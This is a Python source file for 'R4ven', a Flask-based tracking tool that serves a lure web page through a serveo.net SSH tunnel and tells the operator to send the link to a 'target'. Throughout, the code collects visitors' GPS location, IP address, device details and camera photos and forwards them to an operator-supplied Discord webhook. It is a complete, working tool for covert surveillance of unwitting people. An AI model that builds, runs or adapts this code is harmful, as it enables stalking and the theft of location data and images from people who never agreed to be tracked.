#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import logging
from flask import Flask, request, Response, send_from_directory
from utils import get_file_data, update_webhook
import time
import requests
import argparse
import random
import re

# Set up logging
log_file = "r4ven.log"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

DISCORD_WEBHOOK_FILE_NAME = "dwebhook.js"
HTML_FILE_NAME = "index.html"

twitter_url = 'https://spyboy.in/twitter'
discord = 'https://spyboy.in/Discord'
blog = 'https://spyboy.blog/'
github = 'https://github.com/spyboy-productions/r4ven'

VERSION = '1.1.4'

if sys.stdout.isatty():
    R = '\033[31m'  # Red
    G = '\033[32m'  # Green
    C = '\033[36m'  # Cyan
    W = '\033[0m'   # Reset
    Y = '\033[33m'  # Yellow
    M = '\033[35m'  # Magenta
    B = '\033[34m'  # Blue
else:
    R = G = C = W = Y = M = B = ''

placeholders = [f'{R}', f'{G}', f'{C}', f'{Y}', f'{M}', f'{B}']
sc = random.choice(placeholders)

if sys.stdout.isatty():
    sys.stdout.reconfigure(encoding='utf-8')
    banner = rf'''{sc}                                                    
                    _.:._
                  ."\ | /".
{R}.,__{G}              "=.\:/.="              {R}__,.
 {R}"=.`"=._{G}            /^\            {R}_.="`.="
   ".'.'."{B}=.=.=.=.-,/   \,-{B}.=.=.=.=".{sc}'.'."
     `~.`.{M}`.`.`.`.`.     .'.'.'.'.'.'{sc}.~`
        `~.`` {M}` `{sc}.`.\   /.'{M}.' ' ''{sc}.~`
   {G}R4ven{sc}   `=.-~~-._ ) ( _.-~~-.=`
                    `\ /`
                     ( )
                      Y

{R}Track{W} {G}GPS location{W}, and {G}IP address{W}, and {G}capture photos{W} with {G}device details{W}.
'''
else:
    banner = ''

app = Flask(__name__)

parser = argparse.ArgumentParser(
    description="R4VEN - Track device location, and IP address, and capture a photo with device details.",
    usage=f"{sys.argv[0]} [-t target] [-p port]"
)
parser.add_argument("-t", "--target", nargs="?", help="the target url to send the captured images to", default="http://localhost:8000/image")
parser.add_argument("-p", "--port", nargs="?", help="port to listen on", default=8000)
args = parser.parse_args()

def should_exclude_line(line):
    # Add patterns of lines you want to exclude
    exclude_patterns = [
        "HTTP request"
    ]
    return any(pattern in line for pattern in exclude_patterns)

def start_port_forwarding():
    command = ["ssh", "-R", "80:localhost:8000", "serveo.net"]
    logging.info("Starting port forwarding with command: %s", " ".join(command))
    
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    url_printed = False
    for line in process.stdout:
        line = line.strip()
        if line:
            if "Forwarding HTTP traffic from" in line and not url_printed:
                url = line.split(' ')[-1]
                formatted_url_message = (
                    f"\n{M}[+] {C}Send This URL To Target: {G}{url}{W}\n {R}Don't close this window!{W}")
                print(formatted_url_message)
                logging.info(formatted_url_message)
                url_printed = True
            elif not should_exclude_line(line):
                logging.info(line)
                print(line)
    
    for line in process.stderr:
        line = line.strip()
        if line:
            if not should_exclude_line(line):
                logging.error(line)
                print(line)


@app.route("/", methods=["GET"])
def get_website():
    html_data = ""
    try:
        html_data = get_file_data(HTML_FILE_NAME)
    except FileNotFoundError:
        pass
    return Response(html_data, content_type="text/html")

@app.route("/dwebhook.js", methods=["GET"])
def get_webhook_js():
    return send_from_directory(directory=os.getcwd(), path=DISCORD_WEBHOOK_FILE_NAME)

@app.route("/location_update", methods=["POST"])
def update_location():
    data = request.json
    discord_webhook = check_and_get_webhook_url(os.getcwd())
    update_webhook(discord_webhook, data)
    return "OK"

@app.route('/image', methods=['POST'])
def image():
    i = request.files['image']
    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
    i.save('%s/%s' % (os.getcwd(), f))
    #print(f"{B}[+] {C}Picture of the target captured and saved")

    webhook_url = check_and_get_webhook_url(os.getcwd())
    files = {'image': open(f'{os.getcwd()}/{f}', 'rb')}
    response = requests.post(webhook_url, files=files)

    return Response("%s saved and sent to Discord webhook" % f)

@app.route('/get_target', methods=['GET'])
def get_url():
    return args.target

def get_user_choice():
    print(f"{B}[~] {C}What would you like to do?{W}\n")
    print(f"{Y}1. {W}Track Target GPS Location")
    print(f"{Y}2. {W}Capture Target Image")
    print(f"{Y}3. {W}Fetch Target IP Address")
    print(f"{Y}4. {W}All Of It")
    print(f"\n{M}Note: {W}IP address & Device details available in all the options")
    choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}")
    return choice

def ask_port_forwarding():
    print(f'____________________________________________________________________________\n')
    print(f"{B}[~] {C}Do you want to use Serveo for port forwarding?{W}\n")
    print(f"{Y}1. {W}Yes")
    print(f"{Y}2. {W}No, I will use another method")
    print(f"\n{M}Note: {W}In windows {R}Serveo.net{W} might not work, use option 2 and port forward using tool like Ngrok\n or install WSL2 and some linux distro from windows store and then run the tool using their terminal.")
    choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}")
    return choice

def check_and_get_webhook_url(folder_name):
    file_path = os.path.join(folder_name, DISCORD_WEBHOOK_FILE_NAME)

    # Regular expression to match valid Discord webhook URLs
    webhook_regex = re.compile(
    r'^https://(discord(app)?\.com)/api(/v\d+)?/webhooks/\d+/[A-Za-z0-9_-]+/?$')
    

    def is_valid_webhook(url):
        return webhook_regex.match(url) is not None

    def get_valid_webhook():
        while True:
            print(f'\n{B}[+] {C}Enter Discord Webhook URL:{W}')
            dwebhook_input = input().strip()
            if is_valid_webhook(dwebhook_input):
                with open(file_path, 'w') as file:
                    file.write(dwebhook_input)
                return dwebhook_input
            else:
                print(f"{R}Invalid webhook. Please enter a valid Discord webhook URL.{W}")

    if not os.path.exists(file_path):
        return get_valid_webhook()
    else:
        with open(file_path, 'r') as file:
            webhook_url = file.read().strip()
            if is_valid_webhook(webhook_url):
                return webhook_url
            else:
                print(f"{R}Invalid webhook URL found in file. Please enter a valid Discord webhook URL.{W}")
                return get_valid_webhook()


def run_flask(folder_name):
    try:
        os.chdir(folder_name)
    except FileNotFoundError:
        print(f"{R}Error: Folder '{folder_name}' does not exist.{W}")
        sys.exit(1)
    
    app.run(debug=False, host="0.0.0.0", port=args.port)

def print_banners():
    """
    prints the program banners
    """
    print(f'{R}{banner}{W}')
    print(f'{G}[+] {C}Version     : {W}{VERSION}')
    print(f'{G}[+] {C}Created By  : {W}Spyboy')
    print(f'{G}[+] {C}Twitter     : {W}{twitter_url}')
    print(f'{G}[+] {C}Discord     : {W}{discord}')
    print(f'{G}[+] {C}Blog        : {W}{blog}')
    print(f'{G}[+] {C}Github      : {W}{github}')
    print(f'____________________________________________________________________________\n')

    log_file_path = os.path.abspath(log_file)
    print(f"{B}[+] {Y}Logs are being saved here:{W} {log_file_path}")

    print(f'\n{B}[!] {R}Note:{G}Track info will be sent to your discord webhook {W}')
    print(f'____________________________________________________________________________\n')

def main():
    print_banners()
    choice = get_user_choice()

    if choice not in ['1', '2', '3', '4']:
        print(f"{R}Invalid choice. Exiting.{W}")
        sys.exit(1)
    
    if choice == '1':
        folder_name = 'gps'
    elif choice == '2':
        folder_name = 'cam'
    elif choice == '3':
        folder_name = 'ip'
    elif choice == '4':
        folder_name = 'all'

    check_and_get_webhook_url(folder_name)

    port_forwarding_choice = ask_port_forwarding()
    if port_forwarding_choice == '1':
        # Start port forwarding in a separate thread
        port_forwarding_thread = threading.Thread(target=start_port_forwarding)
        port_forwarding_thread.start()
    else:
        print(f'____________________________________________________________________________\n')
        print(f"{R}Warning: {W}Port forwarding is necessary for the application to work on other devices.\n Make sure to set it up using another method."
           f"{Y}ngrok, cloudflare, localhost.run etc.{W}")
        print(f'____________________________________________________________________________\n')
    
    # Start the Flask server
    #start_message = f"{G}[+] {C}Flask server started!{W}"
    start_message = f"{G}[+] {C}Flask server started! Running on {W}http://127.0.0.1:{args.port}/\n {R}Press CTRL+C to quit{W}"
    print(f"\n{start_message}\n")
    logging.info(start_message)
    
    run_flask(folder_name)

if __name__ == "__main__":
    main()
